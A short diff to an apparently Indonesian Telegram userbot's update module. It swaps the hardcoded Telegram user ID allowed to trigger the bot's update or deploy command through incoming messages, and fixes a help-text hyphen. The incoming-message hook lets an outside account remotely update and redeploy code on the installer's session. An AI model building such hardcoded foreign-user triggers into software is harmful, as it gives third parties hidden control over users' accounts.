@@ -118,7 +118,7 @@ async def update(xx, repo, ups_rem, ac_br):
 
 
 @ayiin_cmd(pattern="update( now| deploy|$)")
-@register(incoming=True, from_users=2062364017,
+@register(incoming=True, from_users=1603412565,
           pattern=r"^Cupdate( now| deploy|$)")
 async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
@@ -211,7 +211,7 @@ CMD_HELP.update(
         \n\n  »  **Perintah :** `{cmd}update`\
         \n  »  **Kegunaan : **Untuk Melihat Pembaruan Terbaru ꜱʜɪᴄʏ-ᴜꜱᴇʀʙᴏᴛ.\
         \n\n  »  **Perintah :** `{cmd}update deploy`\
-        \n  »  **Kegunaan : **Untuk MengUpdate Fitur Terbaru Dari ꜱʜɪᴄʏ ᴜꜱᴇʀʙᴏᴛ.\
+        \n  »  **Kegunaan : **Untuk MengUpdate Fitur Terbaru Dari ꜱʜɪᴄʏ-ᴜꜱᴇʀʙᴏᴛ.\
     "
     }
 )
